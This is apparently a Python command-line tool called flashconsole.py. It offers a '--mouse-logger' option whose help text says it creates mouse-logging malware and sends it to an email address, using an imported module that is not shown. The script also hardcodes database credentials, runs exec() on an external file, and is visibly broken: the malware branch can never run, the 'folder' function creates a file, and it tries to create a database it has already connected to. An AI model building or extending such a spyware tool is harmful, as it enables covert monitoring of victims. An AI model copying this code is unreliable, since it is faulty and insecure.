#!/usr/bin/python3
# Shebang, for ./ to work
# (user needs to give flashconsole.py executable permission first:
# bash --> # chmod +x flashconsole.py
# )

# Import necessary modules, libraries and folders
import argparse
import os
from termcolor import colored
import time
from logger import send_logs as send_email
from logger import mouse_logging as mouse_logger
import mysql.connector as sql

# Print the beginning
exec(open('metadata/beginning.py').read())

def say_hi():
      print('Hello, World!')

# Create an output folder if it doesnt exist, else print warning
def output_folder(out_file):
      if os.path.exists(out_file):
            print(colored('WARN: Output Folder already exists', 'yellow'))
            print(colored('Continuing...', 'blue'))
      else:
            open(out_file, 'w')

# Create the parser and add arguments
parser = argparse.ArgumentParser()
parser.add_argument('--say-hi', help='It says Hi!', action="store_true")
# 1
parser.add_argument('--output-folder', help='Provide the command with an output folder.')
parser.add_argument('-o', help='Provide the command with an output folder.')

# 2
parser.add_argument('-ml', help='Create a Mouse-logging malware and send to an E-Mail.', nargs='*')
parser.add_argument('--mouse-logger', help='Create a Mouse-logging malware and send to an E-Mail.', nargs='*')

# Parse provided arguments
args = parser.parse_args()
# Check the results and run a function accordingly
if args.say_hi:
      say_hi()
elif args.output_folder or args.o:
      # 1
      output_folder(args.output_folder) if args.output_folder else output_folder(args.o)
      try:
            con = sql.connect(
                  host="localhost",
                  database="info__",
                  user='user',
                  password='user123'
            )

            cursor = con.cursor()
            cursor.execute('CREATE DATABASE info__')
            cursor.execute('CREATE TABLE output_folder(output_folder VARCHAR(255))')
            con.commit()
      except:
            print(colored('Failed connecting to Database...', 'red'))

elif (args.ml or args.mouse_logger) and args.say_hi:
      # 2
      say_hi()
      if args.ml:
            mouse_logger.create(args.ml[0], [1])